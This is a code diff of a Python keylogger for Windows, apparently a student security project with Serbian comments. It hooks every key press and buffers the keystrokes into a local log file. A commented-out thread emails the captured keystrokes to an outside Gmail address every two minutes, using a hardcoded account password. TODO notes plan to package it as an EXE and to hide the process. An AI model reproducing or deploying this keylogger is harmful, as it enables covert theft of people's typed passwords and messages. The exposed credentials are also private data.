@@ -1,26 +1,71 @@
-import pyHook, pythoncom
-import logging
+import pythoncom, pyHook
+import os
+import sys
+import threading
+import smtplib
+import datetime,time
 
-# Putanja do dumpa, samo za test
-file_log = 'C:\\Users\\Milos Milovanovic\\Desktop\\Sbes proj\\sigurnost\\log.txt'
+data = ''
 
-# Funkcija koja se poziva svaki put kada se pritisne dugme
 def keyPressed(event):
-    # Konfiguracija logovanja, biramo filename, level i format cuvanja
-    logging.basicConfig(filename = file_log, level = logging.DEBUG, format='%(message)s')
-    # Uzimamo karakter, i na svakih 10 karaktera logujemo u fajl
-    chr(event.Ascii)
-    logging.log(10, chr(event.Ascii))
+    global data
+
+    key = chr(event.Ascii)
+    data = data + key
+
+    if len(data) > 10:
+        fp = open("C:\\Users\\Milos Milovanovic\\Desktop\\Sbes proj\\sigurnost\\log.txt", "a")
+        fp.write(data)
+        fp.close()
+        data = ''
+
     return True
 
-#Potreban objekat pyHooka da povezemo tastaturu
 obj = pyHook.HookManager()
-#Pozivam funkciju na svako dugme
 obj.KeyDown = keyPressed
 obj.HookKeyboard()
-#Prosledjuj logove
 pythoncom.PumpMessages()
 
-# 1. UBACITI POKRETANJE IZ CMDA KROZ SKRIPTUivana zecevic
-# 2. UBACITI FUNKCIONALNOST SLANJA DUMPA NA FTP ACCOUNT
+'''
+#Email Logs
+class TimerClass(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.event = threading.Event()
+    def run(self):
+        while not self.event.is_set():
+            global data
+            if len(data)>10:
+                ts = datetime.datetime.now()
+                SERVER = "smtp.gmail.com" #Specify Server Here
+                PORT = 587 #Specify Port Here
+                USER="mmilos015@gmail.com"#Specify Username Here 
+                PASS="milos milovanovic je iz kljajiceva123"#Specify Password Here
+                FROM = USER#From address is taken from username
+                TO = "milovanovicmmilos99@gmail.com" #Specify to address.Use comma if more than one to address is needed.
+                SUBJECT = "Keylogger data: "+str(ts)
+                MESSAGE = data
+                message = """\
+From: %s
+To: %s
+Subject: %s
+%s
+""" % (FROM, TO, SUBJECT, MESSAGE)
+                try:
+                    server = smtplib.SMTP()
+                    server.connect(SERVER,PORT)
+                    print('Uspesno povezan na server')
+                    server.starttls()
+                    server.login(USER,PASS)
+                    print('Uspesno ulogovan')
+                    server.sendmail(FROM, TO, message)
+                    data=''
+                    server.quit()
+                except Exception as e:
+                    print(e)
+            self.event.wait(120)
+'''
+
+# 1. SKRIPTU KOMPAJLIRATI U EXE FAJL POMOCU PYINSTALLERA
+# 2. UBACITI FUNKCIONALNOST SLANJA DUMPA NA MAIL ACCOUNT
 # 3. MOZDA SKONTATI KAKO PRIKRITI PROCES
